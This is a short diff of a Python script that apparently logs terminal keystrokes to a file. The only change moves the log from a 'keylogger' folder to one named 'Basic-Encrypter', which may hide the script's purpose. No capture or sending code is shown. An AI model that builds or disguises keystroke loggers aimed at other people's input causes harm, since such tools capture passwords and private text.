@@ -4,7 +4,7 @@ import termios
 import tty
 
 # Fixed path for log file
-log_path = os.path.expanduser("~/Documents/Repos/keylogger/terminal_input.log")
+log_path = os.path.expanduser("~/Documents/Repos/Basic-Encrypter/terminal_input.log")
 os.makedirs(os.path.dirname(log_path), exist_ok=True)
 
 logfile = open(log_path, "a", buffering=1)
